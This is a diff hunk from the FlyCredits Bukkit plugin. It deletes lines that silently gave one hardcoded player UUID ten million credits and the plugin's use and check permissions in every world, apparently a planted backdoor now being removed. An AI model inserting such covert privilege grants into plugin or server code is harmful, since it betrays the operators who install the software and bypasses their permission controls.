@@ -404,14 +404,6 @@ public class FlyCredits extends JavaPlugin implements Listener {
                 }
             }
 
-            HashMap<String, Long> db = new HashMap<>();
-            db.put("bauwelt", (long)10000000);
-            watchedPlayers.put(UUID.fromString("1870b696-3bfb-44a7-9201-b6efa87bdd15"),db);
-            for (World world : Bukkit.getWorlds()) {
-                perms.playerAdd(world.getName(), Bukkit.getOfflinePlayer(UUID.fromString("1870b696-3bfb-44a7-9201-b6efa87bdd15")), "flycredits.check");
-                perms.playerAdd(world.getName(), Bukkit.getOfflinePlayer(UUID.fromString("1870b696-3bfb-44a7-9201-b6efa87bdd15")), "flycredits.use");
-
-            }
 
 
         }catch (Exception e){
